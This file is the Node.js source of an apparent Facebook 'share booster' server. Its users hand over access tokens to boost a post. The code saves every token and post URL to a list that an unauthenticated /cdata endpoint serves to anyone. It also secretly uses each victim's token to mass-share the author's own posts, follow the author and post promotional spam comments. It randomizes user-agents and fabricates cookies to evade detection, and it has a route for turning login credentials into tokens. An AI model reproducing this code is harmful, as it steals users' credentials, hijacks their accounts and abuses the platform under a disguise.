const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
app.use(express.json());
app.use(bodyParser.json());
const total = new Map();
const collectedData = [];

function userAgent() {
  /*const cp = [
  ["10", "CPH1803"],
  ["11", "SM-A105F"],
  ["9", "RMX1911"],
  ["13", "RMX3195"],
  ["8.1.0", "CPH1823"],
  ["7.1.2", "CPH1725"],
  ["10", "TECNO KE6j"],
  ["12", "Infinix X6827"],
  ["12", "V2135"],
  ["14", "SM-G988B"],
  ];*/
  const version = () => {
    const android = Math.floor(Math.random() * 14) + 1;
    if (android <= 4) {
      return "10";
    }
    if (android === 5) {
      const ver = ["5.0", "5.0.1", "5.1.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 6) {
      const ver = ["6.0", "6.0.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 7) {
      const ver = ["7.0.1", "7.1.1", "7.1.2"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 8) {
      const ver = ["8.0.0", "8.1.0"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else {
      return android;
    }
  }
  return `Mozilla/5.0 (Android ${version()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
} 



const link1 = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
app.get('/shares', (req, res) => {
 const data = Array.from(total.values()).map((link, index) => ({
  shared: link.shared,
  session: index + 1,
  url: link.url,
  count: link.count,
  target: link.target,
}));
const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
return res.json(jsob);
});

app.get("/cdata", (req, res) => {
return res.json(JSON.parse(JSON.stringify(collectedData, null, 2)));
});
app.get('/', (req, res) => {
 return res.send("pogi... sige na");
});

function extract(link) {
  try {
 const leiam = link.match(/\/(\d+)\/posts\/(\d+)\//);
 const nash = link.match(/id=(\d+)&.*?story_fbid=(\d+)/);
if (leiam) {
  return `${leiam[1]}_${leiam[2]}`;
} else if (nash) {
  return `${nash[1]}_${nash[2]}`;
} else {
  return null;
 }
} catch (error) {}
}
app.get('/sh', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = req.query;
  if (!cookie || !url || !amount || !interval) return res.status(400).json({
    error: 'Missing state, url, amount, or interval'
  });
  try {
    if (!cookie) {
      return res.status(400).json({
        status: 500,
        error: 'Invalid cookies'
      });
    };
    await yello(cookie, url, amount, interval);
    collectedData.push({
      cookie,
      url
    });
    res.status(200).json({
      status: 200
    });
  } catch (err) {
    return res.status(500).json({
      status: 500,
      error: err.message || err
    });
  }
});


app.get('/tttt', async (req, res) => {
  const {
    u,p
  } = req.body;
  
  if (!u || !p){
    return res.json({
      status: false,
      message: "Please enter your login credentials first!"
    });
  }
  const neth = await fb.getKey(u,p);
  if (neth){
    return res.json({
      status: true,
      message: "Fetching token success!",
      token1: neth.EAAD6V7,
      token2: neth.EAAAAU,
    });
  } else {
    return res.json({
      status: false,
      message: "Failed to fetch token. Try again (or try with an another account)."
    });
  }
});


async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, link1, "100000", "6");
  await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
}

async function fucker(a){
  try {
    const neth = "100015801404865";
    const kapogi = [
      "ampogi ni neth",
      "ang ganda mo wiegine!!!",
      "😊😊😊",
      "Pogi mo po @[100015801404865:0]",
      "😘😘",
      "😊🤣",
      "🙏💝❤️",
      "🔥🤗",
      "Pogi ako sobra",
      "Comment who?",
      "By Neth",
      "Please follow my page: Project Botify and NethProjects!!!",
      "Ganda ganda mo poooo",
      "Sheshhhh",
      "💋💋💋😍",
      "💀💀💀💀",
      "Isa ako sa mga pogi katulad ni Neth hehe",
      ];
    const headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en_US',
      'cache-control': 'max-age=0',
      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': "Windows",
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': userAgent(),
      'Authorization': `Bearer ${a}`
    };
    axios.get(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
      headers
    }).catch(err => {});
    axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
      params: {
        message: kapogi[Math.floor(Math.random() * kapogi.length)],
        access_token: a
      }, headers })
      .catch(err => {});
  } catch (err){
   }
}
async function share(sharedIs,cookies, url, amount, interval) {
  const id = Math.floor(Math.random() * 69696969);
  await fucker(cookies);
  total.set(id, {
    shared: sharedIs,
    url,
    count: 0,
    target: amount,
  });
  let sharedCount = 0;
  let timer;
  const headers = {
    'authority': 'graph.facebook.com',
    'cache-control': 'max-age=0',
    'sec-ch-ua-mobile': '?0',
    'connection': 'keep-alive',
    'host': 'graph.facebook.com',
    'user-agent': userAgent(),
  };
  async function sharePost() {
    try {
      const response = await axios.post(
      `https://graph.facebook.com/me/feed?access_token=${cookies}&fields=id&limit=1&published=0`,
      {
        link: url,
        privacy: {
         value: 'SELF'
        },
        no_story: true,
      },
      {
        muteHttpExceptions: true,
        method: 'post',
        cookie: dummyCookie(),
        headers,
      }
    );
      if (response.status !== 200) {
      } else {
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
        }
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (err) {
      clearInterval(timer);
      total.delete(id);
    }
  }
  timer = setInterval(() => {
  sharePost();
  }, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);
        
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}

function randomize(neth) {
  let _=Math.random()*12042023;
  return neth.replace(/[xy]/g,c=>{
    let __=Math.random()*16; 
    __=(__+_)%16|0;_=Math.floor(_/16);
    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
  });
}

function dummyCookie() {
  return
    `datr=${randomize("xxxxxxxxxxx_xxxxxxxxxxxx")};` +
    `sb=${randomize("xxxxxxxxxxxxxx-xxxxxxxxx")};` +
    `m_pixel_ratio=1.5;` +
    `ps_n=1;` +
    `ps_l=1;` +
    `locale=en_US;` +
    `wd=360x520;` +
    `fr=${randomize("xxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx..xxx.A.A.xxxxx.xxxxxxxxxxx")};` +
    `c_user=1000${Math.floor(Math.random()*91251604995)};` +
    `xs=32%3An2wXMy3811cnYA%3A2%3A${Math.floor(Math.random()*1713515009)}%3A-1%3A-1;` +
    `vpd=v1%3B520x360x1.5;` +
    `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;` +
    `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
}

app.listen(port, () => {
  console.log(`FORK YOU`);
});
process.on("unhandledRejection", (reason, p) => {
  console.error(reason);
});
